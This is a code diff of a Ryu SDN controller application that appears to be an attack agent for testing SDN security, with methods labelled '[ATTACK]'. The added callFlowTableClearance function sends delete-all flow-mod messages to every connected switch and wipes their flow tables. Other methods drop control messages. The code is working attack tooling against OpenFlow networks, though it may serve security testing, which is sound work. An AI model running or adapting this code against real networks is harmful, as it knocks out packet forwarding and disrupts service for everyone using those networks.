@@ -8,17 +8,24 @@ from ryu.lib.packet import packet
 from ryu.lib.packet import ethernet
 from ryu.ofproto import ofproto_protocol
 from ryu.controller import dpset
+from ryu.ofproto import ofproto_v1_0
 from ryu.ofproto import ofproto_v1_3
-from ryu.lib import ofctl_v1_3
+from ryu.lib import ofctl_v1_0
 
 class AppAgent(app_manager.RyuApp):
+    #OFP_VERSIONS = [ofproto_v1_0.OFP_VERSION]
     OFP_VERSIONS = [ofproto_v1_3.OFP_VERSION]
+    _CONTEXTS = {
+        'dpset': dpset.DPSet
+    }
 
     def __init__(self, *args, **kwargs):
         from am_interface import AMInterface
         super(AppAgent, self).__init__(*args, **kwargs)
+        self.dpset = kwargs['dpset']
         self.drop = 0
         self.modify = 0
+        self.clear = 0
         self.msg = None
         # Run AMInterface Thread    
         ami = AMInterface(self)
@@ -34,7 +41,7 @@ class AppAgent(app_manager.RyuApp):
 
     # 3.1.020 drop
     def callControlMessageDrop(self):
-        pkt = packet.Packet(msg.data)
+        pkt = packet.Packet(self.msg.data)
         eth = pkt.get_protocols(ethernet.ethernet)[0]
         print "Drop Packet Info: "
         print str(eth)
@@ -60,22 +67,26 @@ class AppAgent(app_manager.RyuApp):
 
     # 3.1.070
     def testFlowRuleModification(self):
-        print "testFlowRuleModification"
+        print "[ATTACK] Start Flow Rule Modification"
+
 
     # 3.1.080
     def testFlowTableClearance(self):
-        print "testFlowTableClearance"
-        ofctl_v1_3.delete_flow_entry(self.msg.datapath)
+        print "[ATTACK] Start Flow Table Clearance"
+        self.clear = 1
 
-    def flow_request(self):
+    def callFlowTableClearance(self):
+
+        #for dp in self.dpset.dps.values():
+        #    ofctl_v1_0.delete_flow_entry(dp)
+
         for dp in self.dpset.dps.values():
-            match = dp.ofproto_parser.OFPMatch(
-                dp.ofproto.OFPFW_ALL, 0, 0, 0, 0, 0, 0, 0, 0, 0,
-                0, 0, 0)
-            stats = dp.ofproto_parser.OFPFlowStatsRequest(
-                dp, 0, match, 0xff, dp.ofproto.OFPP_NONE)
-            dp.send_msg(stats)
-            print str(dp)
+            match = dp.ofproto_parser.OFPMatch()
+            flow_mod = dp.ofproto_parser.OFPFlowMod(datapath=dp, match=match, cookie=0,
+                                                    out_port=dp.ofproto.OFPP_ANY,
+                                                    out_group=dp.ofproto.OFPG_ANY,
+                                                    command=dp.ofproto.OFPFC_DELETE)
+            dp.send_msg(flow_mod)
 
     # 3.1.090
     def testEventListenerUnsubscription(self):
@@ -87,26 +98,8 @@ class AppAgent(app_manager.RyuApp):
 
         if self.drop:
             self.callControlMessageDrop()
-
-    @set_ev_cls(ofp_event.EventOFPFlowStatsReply,
-                MAIN_DISPATCHER)
-    def stats_reply_handler(self, ev):
-        ofctl_v1_0.delete_flow_entry(ev.msg.datapath)
-        for stats in ev.msg.body:
-            actions = ofctl_v1_0.actions_to_str(stats.actions)
-            match = ofctl_v1_0.match_to_str(stats.match)
-            print {'dpid' : ev.msg.datapath.id,
-                   'priority': stats.priority,
-                   'cookie': stats.cookie,
-                   'idle_timeout': stats.idle_timeout,
-                   'hard_timeout': stats.hard_timeout,
-                   'actions': actions,
-                   'match': match,
-                   'byte_count': stats.byte_count,
-                   'duration_sec': stats.duration_sec,
-                   'duration_nsec': stats.duration_nsec,
-                   'packet_count': stats.packet_count,
-                   'table_id': stats.table_id}
+        if self.clear:
+            self.callFlowTableClearance()
 
 if __name__ == "__main__":
     a = AppAgent()
